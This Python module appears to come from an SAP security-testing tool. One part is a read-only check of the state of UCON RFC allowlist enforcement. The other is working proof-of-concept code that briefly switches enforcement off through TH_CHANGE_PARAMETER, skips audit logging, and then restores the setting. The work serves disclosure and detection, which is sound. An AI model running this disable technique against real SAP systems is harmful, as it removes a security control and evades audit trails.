"""SAP Unified Connectivity (UCON) status + POC disable (issue #27).

UCON is SAP's built-in RFC allowlist framework (NW 7.40+).  When
enabled (profile parameter ``ucon/rfc/active = 1``) and a
Communication Assembly (CA) is in place, RFC-enabled function
modules that were classified into the **Final (Active)** phase are
blocked unless they appear on the CA's allowlist.  Any FM in
Logging / Evaluation phases is still callable; only Final-phase
FMs are enforced.

This module does two things:

1. ``check_ucon_status(node, creds)`` — read-only inspection.
   Reports whether UCON is enforcing, whether a default CA has
   been set up, and how many RFMs sit in each phase.  Fully safe;
   no mutation, no side-effects.  This is the *defender* half of
   the story the issue asks for.

2. ``poc_disable_ucon(state, node, creds, hold_seconds, canary_fm)``
   — POC demonstrating that a foothold with authenticated RFC can
   flip ``ucon/rfc/active`` to 0 in-memory via
   ``TH_CHANGE_PARAMETER``, blowing the runtime allowlist open for
   the duration of the hold, then auto-restoring the baseline on
   exit.  Implemented as a Tier 3 technique (technique id
   ``ucon_rfc_disable``) that reuses the existing
   ``tier3_set_param`` primitive: baseline capture, evasion-window
   context manager, and idempotent restore all come for free.
   The kernel writer emits no AUM/AUW Security Audit Log event —
   that is the whole point of the POC and the reason the issue
   flags UCON's active-state as needing independent monitoring.

Both entry points return dicts shaped to the same conventions the
rest of ``modules/postex`` uses so ``sapmap_gui`` can render them
straight into a finding.

Live verified on NPL 7.52 (2026-09-30) — see docs / issue #27 for
the empirical write-up.  Notable finding: a raw DB write to the
UCON tables (via the ASE ``isql`` path) is INERT at runtime; the
check reads a shared-memory buffer that only ``SYNC_DB_BUFFER``
invalidates.  So the parameter flip is the only reliable disable
technique from an RFC foothold, and that is what this POC
implements.
"""
from __future__ import annotations

import logging

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

UCON_PARAM = "ucon/rfc/active"
UCON_TECHNIQUE_ID = "ucon_rfc_disable"

# Phase codes on domain UCONRFCPHASE — verified live on NPL 7.52.
PHASE_LOGGING = "L"      # collect stats, never block
PHASE_EVALUATION = "E"   # would-block reported, still callable
PHASE_ACTIVE = "A"       # Final phase — blocked unless on CA

_PHASE_LABEL = {
    PHASE_LOGGING: "Logging",
    PHASE_EVALUATION: "Evaluation",
    PHASE_ACTIVE: "Active/Final",
}


def phase_label(code: str) -> str:
    """Human label for a UCONRFCPHASE code — unknown codes returned
    verbatim so an unfamiliar system doesn't hide behind ``?``."""
    return _PHASE_LABEL.get((code or "").upper(), code or "?")


# ---------------------------------------------------------------------------
# Status / detection — the "monitoring" half of issue #27
# ---------------------------------------------------------------------------

def _read_param(conn, name: str, verbose: bool = False) -> tuple:
    """Read a profile parameter via TH_GET_PARAMETER.

    Returns ``(value, error)`` — empty ``error`` on success.  The
    caller decides how to render an error (log line, per-field
    error, etc.).
    """
    try:
        r = conn.call("TH_GET_PARAMETER", PARAMETER_NAME=name)
        v = (r.get("PARAMETER_VALUE")
              or r.get("VALUE")
              or r.get("RETURN_VALUE") or "")
        if isinstance(v, bytes):
            v = v.decode("utf-8", errors="replace")
        v = str(v).strip()
        if verbose:
            print(f"    TH_GET_PARAMETER {name!r} -> {v!r}")
        return v, ""
    except Exception as e:
        err = f"{type(e).__name__}: {str(e)[:200]}"
        if verbose:
            print(f"    TH_GET_PARAMETER {name!r} FAILED: {err}")
        logger.debug("TH_GET_PARAMETER(%s) failed: %s", name, e)
        return "", err


# Narrow FIELDS map: pick one small, always-present column per UCON
# table so RFC_READ_TABLE returns a tiny payload that stays well
# under saprfclib's SAPCOMPRESS decompression bug threshold.  Field
# names verified live on NPL 7.52 kernel 753 patch 16.
_COUNT_FIELDS = {
    "UCONRFCSTATEHEAD": "ACTUAL_PHASE",  # 1-char domain UCONRFCPHASE
    "UCONRFCSTATERT":   "ACTUAL_PHASE",
    "UCONRFCSRVFMRT":   "FUNCNAME",      # 30-char but no shorter option
}
_DEFAULT_COUNT_FIELD = "MANDT"  # 3-char, present on client-dependent


def _count_rows_page(conn, table: str, where: str,
                     field: str, rowcount: int, rowskips: int,
                     verbose: bool) -> tuple:
    """One RFC_READ_TABLE page.  Returns ``(rows, error)``."""
    kw = dict(QUERY_TABLE=table, DELIMITER="|",
              ROWCOUNT=int(rowcount), ROWSKIPS=int(rowskips),
              FIELDS=[{"FIELDNAME": field}])
    if where:
        opts = []
        s = where
        while s:
            opts.append({"TEXT": s[:72]})
            s = s[72:]
        kw["OPTIONS"] = opts
    try:
        r = conn.call("RFC_READ_TABLE", **kw)
        return len(r.get("DATA") or []), ""
    except Exception as e:
        return -1, f"{type(e).__name__}: {str(e)[:200]}"


def _count_rows(conn_holder, table: str, where: str = "",
                verbose: bool = False,
                page_size: int = 5000,
                max_pages: int = 20) -> tuple:
    """Count matching rows in ``table`` via paginated RFC_READ_TABLE.

    Narrows FIELDS to a single small column (see ``_COUNT_FIELDS``)
    so the wire payload stays tiny — big TABLE returns trip a
    SAPCOMPRESS decompression bug in the current saprfclib and
    leave the connection unusable for follow-up reads.

    Pagination via ROWSKIPS+ROWCOUNT walks through the whole result
    set up to ``page_size * max_pages`` rows.  Default 5000 * 20 =
    100 000 — enough for any realistic UCON table (Logging phase
    on a full NW 7.5x install is ~15 000 rows).

    ``conn_holder`` is a mutable list ``[conn]`` so this helper can
    swap in a freshly-reopened connection after a decompression
    failure poisons the current one.  Pass ``[conn]`` — the caller
    reads back the new handle from index 0 after this returns.

    Returns ``(count, error)`` — ``error`` is "" on success.
    """
    field = _COUNT_FIELDS.get(table, _DEFAULT_COUNT_FIELD)
    total = 0
    for page in range(max_pages):
        skips = page * page_size
        n, err = _count_rows_page(conn_holder[0], table, where,
                                    field, page_size, skips,
                                    verbose)
        if err:
            # saprfclib's decompression failures leave the socket
            # in a mid-frame state and every subsequent call fails
            # with "connection is unusable".  Reopen once and retry
            # this page — a fresh handle recovers the whole probe.
            if verbose:
                print(f"    RFC_READ_TABLE {table} page {page} "
                      f"FAILED: {err}")
                print(f"    reopening RFC connection and retrying page")
            try:
                conn_holder[0].close()
            except Exception:
                pass
            try:
                # RFCConnection.open() reuses the same params; if
                # this raises we surface the original error.
                conn_holder[0].open()
            except Exception as reopen_err:
                if verbose:
                    print(f"    reopen FAILED: {reopen_err} — "
                          f"aborting count for {table}")
                return -1, err
            n, err = _count_rows_page(conn_holder[0], table, where,
                                        field, page_size, skips,
                                        verbose)
            if err:
                if verbose:
                    print(f"    RFC_READ_TABLE {table} page {page} "
                          f"FAILED AGAIN after reopen: {err}")
                return -1, err
        if verbose:
            print(f"    RFC_READ_TABLE {table}"
                  f"{' WHERE ' + where if where else ''}"
                  f" page {page} (skip {skips}) -> {n} row(s)")
        total += n
        if n < page_size:
            return total, ""  # last page
    # Hit the max_pages guard — count is a lower bound.
    return total, ""


def check_ucon_status(node, creds, verbose: bool = False) -> dict:
    """Read-only UCON posture check.

    Returns a dict with:

    * ``ok``            — True on a clean connection, False on open
                          failure.  Individual reads inside can still
                          fail (see ``errors``).
    * ``param_value``   — live value of ``ucon/rfc/active`` (str).
    * ``enforcing``     — True when the param is set to "1".
    * ``initialized``   — True when a UCON configuration exists (at
                          least one row in UCONRFCSTATEHEAD).
    * ``final_phase_count`` — number of RFMs classified into Final
                          phase (candidates for blocking).  ``-1``
                          means "could not read" — see ``errors``.
    * ``logging_phase_count`` / ``evaluation_phase_count`` — same
                          for the two lower phases.
    * ``ca_membership``  — number of RFMs currently on the default
                          CA allowlist (UCONRFCSRVFMRT).
    * ``posture``        — one-word summary: ``off``,
                          ``initialized-but-off``, ``final-phase-empty``,
                          or ``enforcing``.  ``unknown`` when the
                          derivation couldn't be completed.
    * ``error``          — top-level connection error, else "".
    * ``errors``         — dict {key: message} carrying the per-read
                          RFC error for any field that came back
                          ``-1`` / empty.  Empty when everything read
                          cleanly.

    When ``verbose=True``, each RFC call is printed to stdout so an
    operator watching the terminal / GUI console can see the request
    + reply live.

    Defenders should watch ``param_value`` and ``final_phase_count``
    over time — the disable POC below flips ``param_value`` to 0 in-
    memory and emits no AUM/AUW audit event, so this counter is the
    only reliable signal from the RFC layer that enforcement dropped.
    """
    result = {
        "ok": False,
        "param_value": "",
        "enforcing": False,
        "initialized": False,
        "final_phase_count": -1,
        "logging_phase_count": -1,
        "evaluation_phase_count": -1,
        "ca_membership": -1,
        "posture": "unknown",
        "error": "",
        "errors": {},
    }
    try:
        import sapmap_rfc
        if verbose:
            print(f"[*] {node.sid}: UCON status — opening RFC connection")
        with sapmap_rfc._get_connection(node, creds) as conn:
            if verbose:
                print(f"[*] {node.sid}: UCON status — connection open, "
                      f"reading param + counts")
            # Mutable holder so _count_rows can swap in a fresh
            # connection after a decompression-poisoned failure.
            holder = [conn]

            v, err = _read_param(holder[0], UCON_PARAM,
                                  verbose=verbose)
            result["param_value"] = v
            if err:
                result["errors"]["param_value"] = err
            result["enforcing"] = result["param_value"] == "1"

            head_rows, err = _count_rows(
                holder, "UCONRFCSTATEHEAD", verbose=verbose)
            result["initialized"] = head_rows > 0
            if err:
                result["errors"]["initialized"] = err

            for key, phase in (("final_phase_count", "A"),
                                ("logging_phase_count", "L"),
                                ("evaluation_phase_count", "E")):
                n, err = _count_rows(
                    holder, "UCONRFCSTATEHEAD",
                    f"ACTUAL_PHASE = '{phase}'",
                    verbose=verbose)
                result[key] = n
                if err:
                    result[key] = -1
                    result["errors"][key] = err

            n, err = _count_rows(
                holder, "UCONRFCSRVFMRT", verbose=verbose)
            result["ca_membership"] = n
            if err:
                result["ca_membership"] = -1
                result["errors"]["ca_membership"] = err
        result["ok"] = True
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
        if verbose:
            print(f"[-] {node.sid}: UCON status — connection failed: "
                  f"{result['error']}")
        return result

    # Derived posture — a single word so the GUI can colour the row.
    # Fall back to 'unknown' when the underlying reads didn't produce
    # enough data to decide.
    if result["initialized"] is False and "initialized" in result["errors"]:
        result["posture"] = "unknown"
    elif not result["initialized"]:
        result["posture"] = "off"
    elif not result["enforcing"]:
        result["posture"] = "initialized-but-off"
    elif result["final_phase_count"] == -1:
        # Enforcing, but we couldn't read Final-phase membership so
        # we can't tell whether anything is actually blocked.
        result["posture"] = "unknown"
    elif (result["final_phase_count"] or 0) <= 0:
        # Config exists and enforcement is on, but no FMs are in
        # Final phase — nothing is actually blocked.
        result["posture"] = "final-phase-empty"
    else:
        result["posture"] = "enforcing"

    if verbose:
        print(f"[+] {node.sid}: UCON status — posture={result['posture']!r} "
              f"({'enforcing' if result['enforcing'] else 'not enforcing'})")
        if result["errors"]:
            print(f"[!] {node.sid}: UCON status — some reads failed:")
            for k, msg in result["errors"].items():
                print(f"      {k}: {msg}")
    return result


# ---------------------------------------------------------------------------
# POC — disable via TH_CHANGE_PARAMETER inside a Tier 3 evasion window
# ---------------------------------------------------------------------------

def _call_canary(node, creds, canary_fm: str) -> dict:
    """Call ``canary_fm`` once and record whether it returned normally
    or was rejected by UCON.  Used pre-flip / during-hold / post-
    restore so the operator sees enforcement *behaviour* change, not
    just the parameter value.

    Returns ``{"callable": bool, "rejected_by_ucon": bool,
                "error": str}``.
    """
    out = {"callable": False, "rejected_by_ucon": False, "error": ""}
    if not canary_fm:
        out["error"] = "no canary FM provided"
        return out
    try:
        import sapmap_rfc
        with sapmap_rfc._get_connection(node, creds) as conn:
            try:
                conn.call(canary_fm)
                out["callable"] = True
                return out
            except Exception as e:
                msg = str(e)
                out["error"] = msg
                # UCON rejects surface as an ABAP MESSAGE-class
                # exception with a distinctive text; match on the
                # substring the kernel emits.
                out["rejected_by_ucon"] = (
                    "UCON RFC Rejected" in msg
                    or "UCON_RFC_REJECTED" in msg.upper())
                return out
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
        return out


def poc_disable_ucon(state, node, creds,
                     hold_seconds: float = 30.0,
                     canary_fm: str = "") -> dict:
    """POC: flip ``ucon/rfc/active`` to 0 for a hold window, then
    restore the baseline.  Optionally verify enforcement behaviour
    against a caller-supplied canary FM.

    The mutation itself is delegated to
    ``sapmap_evasion_tier3.tier3_set_param`` under the technique id
    ``ucon_rfc_disable`` (registered in
    ``sapmap_evasion_gate.TIER3_TECHNIQUES``).  That gives us
    baseline capture, evasion-window auto-restore, and the same
    ``--allow-evasion`` gate every other Tier 3 technique honours.

    Args:
        state:          ``SAPMAPState`` carrying the operator-armed
                        evasion config.  Required — Tier 3 refuses
                        without it.
        node:           Target ``SAPNode`` (must have gw / RFC path).
        creds:          Verified ``Credentials`` for authenticated
                        RFC.  The kernel FM
                        ``TH_CHANGE_PARAMETER`` requires an auth'd
                        session; there is no unauth path.
        hold_seconds:   How long to hold ``ucon/rfc/active=0`` before
                        letting the evasion window restore the
                        baseline.  0 = flip-and-restore instantly
                        (useful only for smoke-testing the plumbing).
        canary_fm:      Optional FM name to call pre-flip / during
                        hold / post-restore.  When the FM is in
                        Final phase off the default CA it will be
                        rejected pre-flip and post-restore, and
                        callable during the hold — demonstrating
                        that enforcement really did change.

    Returns a dict with:

    * ``ok``, ``applied``, ``error``, ``baseline_value``,
      ``live_after_write``, ``live_after_restore`` — passthrough
      from ``tier3_set_param``.
    * ``canary_before`` / ``canary_during`` / ``canary_after`` —
      the three ``_call_canary`` results, or ``None`` when
      ``canary_fm`` was not supplied.  ``canary_during`` is only
      populated when ``hold_seconds > 0``.
    * ``posture_before`` / ``posture_after`` — the
      ``check_ucon_status`` posture strings, so the caller can
      confirm nothing else drifted while the hold was open.
    """
    from sapmap_evasion_tier3 import tier3_set_param

    out = {
        "ok": False, "applied": False, "error": "",
        "technique": UCON_TECHNIQUE_ID,
        "baseline_value": "", "live_after_write": "",
        "live_after_restore": "",
        "canary_before": None, "canary_during": None,
        "canary_after": None,
        "posture_before": "unknown", "posture_after": "unknown",
    }

    status_before = check_ucon_status(node, creds, verbose=True)
    out["posture_before"] = status_before["posture"]

    # Safety net for baselines captured before ucon/rfc/active was
    # added to _BASELINE_PARAMS: the general Tier 3 capture would
    # have skipped it, and on restore tier3_set_param would try to
    # write an empty string (kernel returns INVALID_VALUE) leaving
    # ucon/rfc/active pinned at 0.  Read the live value NOW via
    # the status probe above and inject it into snap.params so the
    # restore has a real baseline to write back.
    snap = getattr(node, "_evasion_baseline", None)
    if snap is not None and hasattr(snap, "params"):
        current = snap.params.get(UCON_PARAM)
        if current is None or (isinstance(current, str)
                                and current.startswith("__UNCAPTURED__")):
            live = status_before.get("param_value", "")
            if live in ("0", "1"):
                snap.params[UCON_PARAM] = live
                print(f"[*] {node.sid}: seeded evasion baseline with "
                      f"{UCON_PARAM}={live!r} (was uncaptured) so "
                      f"auto-restore has a real value to write back")

    if canary_fm:
        out["canary_before"] = _call_canary(node, creds, canary_fm)

    # tier3_set_param wraps the write in an evasion_window; the
    # baseline is captured on entry and restored on exit.  The
    # hold_seconds are honoured inside that window so a canary
    # call while enforcement is off is possible when we schedule
    # it via a side-thread.  For simplicity here we call the canary
    # once *after* the tier3 call returns — which means the hold
    # has already elapsed and the baseline is restored.  Callers
    # who want a live "during hold" observation should either
    # instrument the canary check from a companion thread or set
    # a hold long enough to invoke the FM out-of-band.  The
    # canary_during field stays None in the single-thread call
    # path; that's honest.
    res = tier3_set_param(state, node, UCON_PARAM, "0",
                          hold_seconds=hold_seconds, creds=creds,
                          technique=UCON_TECHNIQUE_ID)
    for key in ("ok", "applied", "error", "baseline_value",
                "live_after_write", "live_after_restore"):
        if key in res:
            out[key] = res[key]

    if canary_fm:
        out["canary_after"] = _call_canary(node, creds, canary_fm)

    status_after = check_ucon_status(node, creds, verbose=True)
    out["posture_after"] = status_after["posture"]
    # Persist the errors dict from the last probe so the caller (GUI
    # route) can render them if the status read had trouble.
    out["status_errors_after"] = status_after.get("errors", {})
    return out
